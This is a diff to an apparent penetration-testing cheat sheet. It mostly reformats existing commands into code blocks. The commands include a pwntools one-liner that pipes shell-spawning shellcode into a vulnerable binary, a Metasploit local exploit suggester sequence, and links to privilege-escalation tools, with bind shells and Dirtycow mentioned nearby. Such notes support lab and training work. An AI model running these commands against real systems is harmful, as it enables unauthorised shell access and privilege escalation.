@@ -247,8 +247,13 @@ To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen 
 
 ### BufferOverflow
 To generate shellcode quickly, we can use python `pwn` library.
-* `python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))`
-* `(python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln`
+```
+> $ python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))
+```
+
+```
+> $ (python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln
+```
 
 ### Gobuster with Cookie (Useful to directory traversal when cookie is needed )
 ```
@@ -492,10 +497,10 @@ To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace
 ## Privilige Escalation
 
 ### Standard Scripts for Enumeration
-* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
+* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
 * [Lin Enum Script](https://github.com/rebootuser/LinEnum)
 * [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
-* [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses.
+* [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
 * [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
 
 ### Dirtycow 
@@ -529,10 +534,12 @@ uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
 * In meterpreter shell try `getsystem`
 * In meterpreter shell try `background` and then follow rest of commands.
 * search suggester
-* `use post/multi/recon/local_exploit_suggestor` (Example only)
-* `show options`
-* `set session 1`
-* `run`
+```
+> use post/multi/recon/local_exploit_suggestor
+show options
+set session 1
+run
+```
 * If worked fine, else Try follow rest of commands.
 * Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
 * Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
